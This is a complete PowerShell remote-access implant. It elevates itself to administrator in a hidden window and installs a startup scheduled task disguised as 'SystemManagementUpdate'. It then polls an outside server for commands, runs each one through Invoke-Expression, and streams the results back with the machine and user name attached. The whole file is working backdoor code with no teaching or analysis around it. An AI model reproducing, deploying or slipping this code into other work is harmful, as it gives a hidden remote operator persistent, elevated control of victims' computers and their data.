$cfHost = "https://connect.aniketpandey.website"
$logFile = Join-Path $PSScriptRoot "shell.txt"
$maxLogSizeMB = 5
$retryCount = 0
$maxRetries = 10
$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
$maxChunkBytes = 32000  # cap per-chunk size
$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"  # unique identifier sent to server on every request

# --- Self-elevate to admin and relaunch hidden ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

# --- Persistence ---
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Seconds 30) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

# --- Logging ---
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    try {
        if (Test-Path $logFile) {
            $size = (Get-Item $logFile).Length / 1MB
            if ($size -ge $maxLogSizeMB) {
                Move-Item -Path $logFile -Destination "$logFile.old" -Force
            }
        }
        Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
    } catch {}
}

# --- HTTP setup ---
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
[System.Net.ServicePointManager]::Expect100Continue = $false
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}

# --- HTTP helpers ---
function Send-Http {
    param([string]$Url, [string]$Method = "GET", [string]$Body = $null, [int]$TimeoutMs = 10000)
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = $Method
    $req.UserAgent = "Mozilla/5.0"
    $req.KeepAlive = $true
    $req.Timeout = $TimeoutMs
    $req.ReadWriteTimeout = $TimeoutMs
    if ($Method -eq "POST" -and $Body) {
        # Truncate oversized body (byte-based, not character-based)
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        if ($bodyBytes.Length -gt $maxChunkBytes) {
            $Body = [System.Text.Encoding]::UTF8.GetString($bodyBytes, 0, $maxChunkBytes) + "`n[...truncated]"
        }
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req.ContentType = "text/plain; charset=utf-8"
        $req.ContentLength = $bytes.Length
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
    }
    $resp = $req.GetResponse()
    $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $result = $reader.ReadToEnd().Trim()
    $reader.Close()
    $resp.Close()
    return $result
}

function Get-Command-From-Server {
    try { return Send-Http -Url "$cfHost/cmd?id=$clientId" } catch { throw $_ }
}

function Get-Signal-From-Server {
    try { return Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000 } catch { return "" }
}

function Send-Stream-To-Server {
    param([string]$Body)
    try { Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null }
    catch { Write-Log "Stream send failed: $($_.Exception.Message)" "WARN" }
}

function Send-Result-To-Server {
    param([string]$Body)
    try { Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null }
    catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
}

# --- Persistent runspace (shared across commands, lazy re-creation) ---
$script:persistentRunspace = $null

function Get-PersistentRunspace {
    if ($null -eq $script:persistentRunspace -or $script:persistentRunspace.RunspaceStateInfo.State -ne 'Opened') {
        try { if ($script:persistentRunspace) { $script:persistentRunspace.Dispose() } } catch {}
        $script:persistentRunspace = [runspacefactory]::CreateRunspace()
        $script:persistentRunspace.Open()
        Write-Log "Created new persistent runspace"
    }
    return $script:persistentRunspace
}

# --- Execute command with streaming output + cancel support ---
function Invoke-CommandStreaming {
    param([string]$Command, [int]$Timeout = $cmdTimeout)

    # Handle notimeout: prefix — disable timeout for approved long jobs
    $noTimeout = $false
    if ($Command -match '^notimeout:(.+)$') {
        $Command = $Matches[1].Trim()
        $noTimeout = $true
    }

    # 1) Send header — read cwd from persistent runspace (reflects cd changes)
    $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
    $runspace = Get-PersistentRunspace
    try {
        $cwd = [powershell]::Create().AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
        if (-not $cwd) { $cwd = (Get-Location).Path }
    } catch { $cwd = (Get-Location).Path }
    $header = "PS $cwd> $Command [$timeoutLabel]`n"
    Send-Stream-To-Server -Body $header

    # 2) Use persistent runspace (reused across commands)
    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    # Out-String -Stream gives us line-by-line output for streaming
    $ps.AddScript(@"
        try {
            Invoke-Expression `$args[0] 2>&1 | Out-String -Stream
        } catch {
            "Error: " + `$_.Exception.Message
        }
"@).AddArgument($Command) | Out-Null

    $outputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection.Complete()

    $handle = $ps.BeginInvoke($inputCollection, $outputCollection)

    $lastIndex = 0
    $startTime = Get-Date
    $finished = $false
    $idleCycles = 0

    # 3) Adaptive streaming loop — drain output + check cancel
    while (-not $handle.IsCompleted) {
        # Adaptive interval: fast when output flows, slower when idle
        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
        Start-Sleep -Milliseconds $sleepMs

        # Drain new output lines
        $currentCount = $outputCollection.Count
        if ($currentCount -gt $lastIndex) {
            $idleCycles = 0
            $chunk = ""
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
            $lastIndex = $currentCount
            if ($chunk.Length -gt 0) {
                Send-Stream-To-Server -Body $chunk
            }
        } else {
            $idleCycles++
        }

        # Check timeout (skip if notimeout mode)
        if (-not $noTimeout) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -gt $Timeout) {
                $ps.Stop()
                Send-Result-To-Server -Body "[!] Command timed out after ${Timeout}s.`n"
                Write-Log "Command timed out: $Command" "WARN"
                $finished = $true
                break
            }
        }

        # Check for cancel signal from operator
        $signal = Get-Signal-From-Server
        if ($signal -eq "cancel") {
            $ps.Stop()
            Send-Result-To-Server -Body "[!] Command cancelled by operator.`n"
            Write-Log "Command cancelled: $Command" "INFO"
            $finished = $true
            break
        }
    }

    # 4) Drain any remaining output and send as final result
    if (-not $finished) {
        $currentCount = $outputCollection.Count
        $chunk = ""
        if ($currentCount -gt $lastIndex) {
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
        }
        # Send final result (even if empty — triggers prompt on server)
        Send-Result-To-Server -Body $chunk
    }

    # 5) Cleanup (only dispose the PowerShell instance, NOT the shared runspace)
    try { $ps.Dispose() } catch {}
}

# --- Main loop ---
function Connect-Cloudflare {
    $activeDelay   = 300
    $idleStep1     = 1000
    $idleStep2     = 3000
    $idleStep3     = 5000
    $consecutiveIdle = 0

    Write-Log "Client started. PID=$PID. Connecting to $cfHost"

    while ($true) {
        try {
            $command = Get-Command-From-Server

            if ($command -and $command -ne "") {
                $retryCount = 0
                $consecutiveIdle = 0

                Write-Log "CMD: $command"

                if ($command -eq "exit") {
                    Write-Log "Exit command received. Shutting down."
                    break
                }

                # Streaming execution — handles all output sending internally
                Invoke-CommandStreaming -Command $command

                Start-Sleep -Milliseconds $activeDelay
            }
            else {
                $consecutiveIdle++
                $delay = if ($consecutiveIdle -le 10) { $idleStep1 }
                         elseif ($consecutiveIdle -le 50) { $idleStep2 }
                         else { $idleStep3 }
                Start-Sleep -Milliseconds $delay
            }
        }
        catch {
            $retryCount++
            Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"

            $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
            Start-Sleep -Seconds $backoff

            if ($retryCount -ge $maxRetries) {
                Write-Log "Max retries ($maxRetries) hit. Resetting counter." "WARN"
                $retryCount = 0
            }
        }

        # GC removed — CLR manages collections naturally without forced pauses
    }
}

Connect-Cloudflare